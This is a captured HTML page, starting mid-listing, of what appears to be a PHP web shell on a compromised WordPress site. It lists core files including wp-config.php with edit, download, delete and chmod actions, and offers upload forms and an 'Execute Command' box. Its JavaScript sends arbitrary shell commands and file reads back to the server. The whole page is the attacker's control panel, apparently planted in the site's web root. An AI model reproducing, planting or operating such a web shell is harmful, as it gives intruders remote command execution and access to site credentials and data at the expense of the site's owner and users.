                        <button class="action-btn" onclick="deleteItem('test.php')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('test.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">🐘</span></td>
                    <td class="item-name">
                                                    wp-activate.php                                            </td>
                    <td>7.2 KB</td>
                    <td><span class="badge">0644</span></td>
                    <td>2025-12-24 17:22:50</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('wp-activate.php')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3AtYWN0aXZhdGUucGhw" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('wp-activate.php')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('wp-activate.php')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('wp-activate.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">🐘</span></td>
                    <td class="item-name">
                                                    wp-blog-header.php                                            </td>
                    <td>351 B</td>
                    <td><span class="badge">0644</span></td>
                    <td>2025-12-24 17:22:50</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('wp-blog-header.php')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3AtYmxvZy1oZWFkZXIucGhw" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('wp-blog-header.php')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('wp-blog-header.php')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('wp-blog-header.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">🐘</span></td>
                    <td class="item-name">
                                                    wp-comments-post.php                                            </td>
                    <td>2.3 KB</td>
                    <td><span class="badge">0644</span></td>
                    <td>2024-08-28 19:44:15</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('wp-comments-post.php')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3AtY29tbWVudHMtcG9zdC5waHA=" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('wp-comments-post.php')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('wp-comments-post.php')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('wp-comments-post.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">🐘</span></td>
                    <td class="item-name">
                                                    wp-config-sample.php                                            </td>
                    <td>3.3 KB</td>
                    <td><span class="badge">0644</span></td>
                    <td>2025-12-24 17:22:50</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('wp-config-sample.php')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3AtY29uZmlnLXNhbXBsZS5waHA=" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('wp-config-sample.php')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('wp-config-sample.php')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('wp-config-sample.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">🐘</span></td>
                    <td class="item-name">
                                                    wp-config.php                                            </td>
                    <td>3.2 KB</td>
                    <td><span class="badge">0644</span></td>
                    <td>2025-12-24 17:22:29</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('wp-config.php')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3AtY29uZmlnLnBocA==" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('wp-config.php')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('wp-config.php')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('wp-config.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">🐘</span></td>
                    <td class="item-name">
                                                    wp-cron.php                                            </td>
                    <td>5.5 KB</td>
                    <td><span class="badge">0644</span></td>
                    <td>2025-12-24 17:22:50</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('wp-cron.php')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3AtY3Jvbi5waHA=" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('wp-cron.php')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('wp-cron.php')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('wp-cron.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">🐘</span></td>
                    <td class="item-name">
                                                    wp-links-opml.php                                            </td>
                    <td>2.4 KB</td>
                    <td><span class="badge">0644</span></td>
                    <td>2025-12-24 17:22:50</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('wp-links-opml.php')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3AtbGlua3Mtb3BtbC5waHA=" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('wp-links-opml.php')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('wp-links-opml.php')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('wp-links-opml.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">🐘</span></td>
                    <td class="item-name">
                                                    wp-load.php                                            </td>
                    <td>3.8 KB</td>
                    <td><span class="badge">0644</span></td>
                    <td>2024-08-28 19:44:15</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('wp-load.php')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3AtbG9hZC5waHA=" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('wp-load.php')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('wp-load.php')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('wp-load.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">🐘</span></td>
                    <td class="item-name">
                                                    wp-login.php                                            </td>
                    <td>50.2 KB</td>
                    <td><span class="badge">0644</span></td>
                    <td>2025-12-24 17:22:50</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('wp-login.php')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3AtbG9naW4ucGhw" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('wp-login.php')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('wp-login.php')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('wp-login.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">🐘</span></td>
                    <td class="item-name">
                                                    wp-mail.php                                            </td>
                    <td>8.5 KB</td>
                    <td><span class="badge">0644</span></td>
                    <td>2025-12-24 17:22:50</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('wp-mail.php')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3AtbWFpbC5waHA=" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('wp-mail.php')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('wp-mail.php')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('wp-mail.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">🐘</span></td>
                    <td class="item-name">
                                                    wp-settings.php                                            </td>
                    <td>30.3 KB</td>
                    <td><span class="badge">0644</span></td>
                    <td>2025-12-24 17:22:50</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('wp-settings.php')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3Atc2V0dGluZ3MucGhw" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('wp-settings.php')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('wp-settings.php')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('wp-settings.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">🐘</span></td>
                    <td class="item-name">
                                                    wp-signup.php                                            </td>
                    <td>33.7 KB</td>
                    <td><span class="badge">0644</span></td>
                    <td>2025-12-24 17:22:50</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('wp-signup.php')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3Atc2lnbnVwLnBocA==" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('wp-signup.php')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('wp-signup.php')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('wp-signup.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">🐘</span></td>
                    <td class="item-name">
                                                    wp-trackback.php                                            </td>
                    <td>5.1 KB</td>
                    <td><span class="badge">0644</span></td>
                    <td>2025-12-24 17:22:50</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('wp-trackback.php')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=d3AtdHJhY2tiYWNrLnBocA==" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('wp-trackback.php')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('wp-trackback.php')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('wp-trackback.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                                <tr>
                    <td><span class="item-icon">🐘</span></td>
                    <td class="item-name">
                                                    xmlrpc.php                                            </td>
                    <td>3.1 KB</td>
                    <td><span class="badge">0644</span></td>
                    <td>2025-12-24 17:22:50</td>
                    <td class="action-group">
                                                    <button class="action-btn" onclick="editFile('xmlrpc.php')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=L2hvbWUvbWVleTU1NzUvcHVibGljX2h0bWwvZHJjaGlja2VuLmNvLmlk&download=1&f=eG1scnBjLnBocA==" class="action-btn"><i class="fas fa-download"></i> DL</a>
                                                <button class="action-btn" onclick="renameItem('xmlrpc.php')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('xmlrpc.php')"><i class="fas fa-trash"></i> Del</button>
                                                <button class="action-btn" onclick="chmodItem('xmlrpc.php', '0644')"><i class="fas fa-lock"></i> Chmod</button>
                                            </td>
                </tr>
                            </tbody>
        </table>
    </div>
</div>

<!-- Modals -->
<div id="uploadModal" class="modal"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-upload"></i> Upload</h3><button class="modal-close" onclick="closeModal('uploadModal')">&times;</button></div>
<form method="post" enctype="multipart/form-data"><input type="hidden" name="csrf_token" value="c2fa896cb7ab4224f8e146a0fd32c79a46b8b67f857b1e1c64bfec7997d0cd01"><div class="modal-body"><input type="file" name="file" required></div><div class="modal-footer"><button type="submit" name="upload" class="btn btn-primary">Upload</button><button type="button" class="btn btn-outline" onclick="closeModal('uploadModal')">Cancel</button></div></form></div></div>

<div id="folderModal" class="modal"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-folder-plus"></i> New Folder</h3><button class="modal-close" onclick="closeModal('folderModal')">&times;</button></div>
<form method="post"><input type="hidden" name="csrf_token" value="c2fa896cb7ab4224f8e146a0fd32c79a46b8b67f857b1e1c64bfec7997d0cd01"><div class="modal-body"><input type="text" name="folder_name" placeholder="Folder name" required></div><div class="modal-footer"><button type="submit" name="create_folder" class="btn btn-primary">Create</button><button type="button" class="btn btn-outline" onclick="closeModal('folderModal')">Cancel</button></div></form></div></div>

<div id="fileModal" class="modal"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-file-plus"></i> New File</h3><button class="modal-close" onclick="closeModal('fileModal')">&times;</button></div>
<form method="post"><input type="hidden" name="csrf_token" value="c2fa896cb7ab4224f8e146a0fd32c79a46b8b67f857b1e1c64bfec7997d0cd01"><div class="modal-body"><input type="text" name="file_name" placeholder="Filename" required><textarea name="file_content" placeholder="Content (optional)" rows="5"></textarea></div><div class="modal-footer"><button type="submit" name="create_file" class="btn btn-primary">Create</button><button type="button" class="btn btn-outline" onclick="closeModal('fileModal')">Cancel</button></div></form></div></div>

<div id="commandModal" class="modal"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-terminal"></i> Execute Command</h3><button class="modal-close" onclick="closeCommandModal()">&times;</button></div>
<div class="modal-body"><input type="text" id="cmdInput" placeholder="Command (e.g., ls -la)" autocomplete="off"><button class="btn btn-primary" onclick="runCommand()" style="margin-top:5px; width:100%"><i class="fas fa-play"></i> Run</button><div id="cmdOutput" style="display:none; margin-top:15px"><hr><div class="cmd-output" id="cmdOutputText"></div></div></div>
<div class="modal-footer"><button type="button" class="btn btn-outline" onclick="closeCommandModal()">Close</button></div></div></div>

<div id="renameModal" class="modal"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-pen"></i> Rename</h3><button class="modal-close" onclick="closeModal('renameModal')">&times;</button></div>
<form method="post"><input type="hidden" name="csrf_token" value="c2fa896cb7ab4224f8e146a0fd32c79a46b8b67f857b1e1c64bfec7997d0cd01"><input type="hidden" name="old_name" id="renameOld"><div class="modal-body"><input type="text" name="new_name" id="renameNew" placeholder="New name" required></div><div class="modal-footer"><button type="submit" name="rename" class="btn btn-primary">Rename</button><button type="button" class="btn btn-outline" onclick="closeModal('renameModal')">Cancel</button></div></form></div></div>

<div id="deleteModal" class="modal"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-trash"></i> Confirm Delete</h3><button class="modal-close" onclick="closeModal('deleteModal')">&times;</button></div>
<form method="post"><input type="hidden" name="csrf_token" value="c2fa896cb7ab4224f8e146a0fd32c79a46b8b67f857b1e1c64bfec7997d0cd01"><input type="hidden" name="item" id="deleteItem"><div class="modal-body"><p>Delete <strong id="deleteName"></strong>?</p><p style="color:#ff9500; font-size:0.75rem">⚠️ Cannot be undone!</p></div><div class="modal-footer"><button type="submit" name="delete" class="btn btn-danger">Delete</button><button type="button" class="btn btn-outline" onclick="closeModal('deleteModal')">Cancel</button></div></form></div></div>

<div id="chmodModal" class="modal"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-lock"></i> Change Permission</h3><button class="modal-close" onclick="closeModal('chmodModal')">&times;</button></div>
<form method="post"><input type="hidden" name="csrf_token" value="c2fa896cb7ab4224f8e146a0fd32c79a46b8b67f857b1e1c64bfec7997d0cd01"><input type="hidden" name="item" id="chmodItem"><div class="modal-body"><select name="permission" id="chmodPerm"><option value="644">644 (rw-r--r--)</option><option value="755">755 (rwxr-xr-x)</option><option value="600">600 (rw-------)</option><option value="700">700 (rwx------)</option><option value="777">777 (rwxrwxrwx)</option></select></div><div class="modal-footer"><button type="submit" name="chmod" class="btn btn-primary">Apply</button><button type="button" class="btn btn-outline" onclick="closeModal('chmodModal')">Cancel</button></div></form></div></div>

<div id="editModal" class="modal"><div class="modal-content" style="max-width:700px"><div class="modal-header"><h3><i class="fas fa-edit"></i> Edit File</h3><button class="modal-close" onclick="closeModal('editModal')">&times;</button></div>
<form method="post"><input type="hidden" name="csrf_token" value="c2fa896cb7ab4224f8e146a0fd32c79a46b8b67f857b1e1c64bfec7997d0cd01"><input type="hidden" name="filename" id="editFilename"><div class="modal-body"><textarea name="content" id="editContent" rows="12" style="font-family:monospace"></textarea></div><div class="modal-footer"><button type="submit" name="save_file" class="btn btn-primary">Save</button><button type="button" class="btn btn-outline" onclick="closeModal('editModal')">Cancel</button></div></form></div></div>

<script>
function openModal(id) { document.getElementById(id).classList.add('active'); }
function closeModal(id) { document.getElementById(id).classList.remove('active'); }
function openCommandModal() { openModal('commandModal'); document.getElementById('cmdInput').focus(); document.getElementById('cmdOutput').style.display = 'none'; }
function closeCommandModal() { closeModal('commandModal'); document.getElementById('cmdInput').value = ''; }

async function runCommand() {
    const cmd = document.getElementById('cmdInput').value.trim();
    if (!cmd) { alert('Enter command'); return; }
    const outputDiv = document.getElementById('cmdOutput');
    const outputText = document.getElementById('cmdOutputText');
    outputText.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Running...';
    outputDiv.style.display = 'block';
    try {
        const formData = new FormData();
        formData.append('csrf_token', 'c2fa896cb7ab4224f8e146a0fd32c79a46b8b67f857b1e1c64bfec7997d0cd01');
        formData.append('command', cmd);
        
        const response = await fetch('?ajax_cmd=1', {
            method: 'POST',
            body: formData
        });
        const data = await response.json();
        
        if (data.status === 'success') {
            outputText.innerHTML = data.output || '(no output)';
            outputText.className = 'cmd-output';
        } else {
            outputText.innerHTML = '⚠️ ' + (data.output || 'Command failed');
            outputText.className = 'cmd-output error';
        }
    } catch(e) {
        outputText.innerHTML = 'Error: ' + e.message;
        outputText.className = 'cmd-output error';
    }
}

function renameItem(n) { document.getElementById('renameOld').value = n; document.getElementById('renameNew').value = n; openModal('renameModal'); }
function deleteItem(n) { document.getElementById('deleteItem').value = n; document.getElementById('deleteName').innerText = n; openModal('deleteModal'); }
function chmodItem(n, p) { document.getElementById('chmodItem').value = n; let sel = document.getElementById('chmodPerm'); for(let i=0;i<sel.options.length;i++) if(sel.options[i].value === p.replace(/^0/,'')) sel.selectedIndex=i; openModal('chmodModal'); }
async function editFile(n) { try { let res = await fetch('?get_file=1&f=' + btoa(n)); document.getElementById('editFilename').value = n; document.getElementById('editContent').value = await res.text(); openModal('editModal'); } catch(e) { alert('Cannot load file'); } }
document.getElementById('cmdInput')?.addEventListener('keypress', function(e) { if (e.key === 'Enter') runCommand(); });
window.onclick = function(e) { if (e.target.classList.contains('modal')) e.target.classList.remove('active'); }
function showToast(msg, type) { let t = document.getElementById('toast'); if(!t){ t=document.createElement('div'); t.id='toast'; t.className='toast'; document.body.appendChild(t); } t.className=`toast ${type} show`; t.innerHTML=msg; setTimeout(()=>t.classList.remove('show'),3000); }
</script>
</body>
</html>
